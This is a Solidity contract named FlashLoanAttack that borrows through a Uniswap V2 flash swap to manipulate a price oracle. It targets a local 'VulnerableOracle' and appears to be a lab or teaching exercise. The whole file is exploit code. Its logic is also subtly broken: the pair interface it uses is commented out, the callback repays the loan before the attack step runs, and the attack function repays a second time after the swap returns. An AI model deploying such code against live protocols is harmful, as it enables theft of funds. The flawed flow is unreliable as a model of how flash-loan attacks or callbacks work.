// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../VulnerableOracle.sol";

// interface IUniswapV2Pair {
//     function swap(
//         uint256 amount0Out,
//         uint256 amount1Out,
//         address to,
//         bytes calldata data
//     ) external;

//     function sync() external;
// }

contract FlashLoanAttack {
    IUniswapV2Pair public uniswapPair;
    VulnerableOracle public target;
    IERC20 public tokenA;
    IERC20 public tokenB;

    constructor(
        address _uniswapPair,
        address _target,
        address _tokenA,
        address _tokenB
    ) {
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        target = VulnerableOracle(_target);
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
    }

    function attack() external {
        uint256 loanAmount = 10 ether;
        bytes memory data = abi.encode(loanAmount);

        uniswapPair.swap(loanAmount, 0, address(this), data);

        target.depositAndWithdraw(loanAmount);

        uint256 fee = (loanAmount * 3) / 1000;
        uint256 totalRepayment = loanAmount + fee;
        tokenA.transfer(address(uniswapPair), totalRepayment);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "Unauthorized call");
        uint256 loanAmount = abi.decode(data, (uint256));
        tokenA.transfer(address(uniswapPair), loanAmount);
    }
}
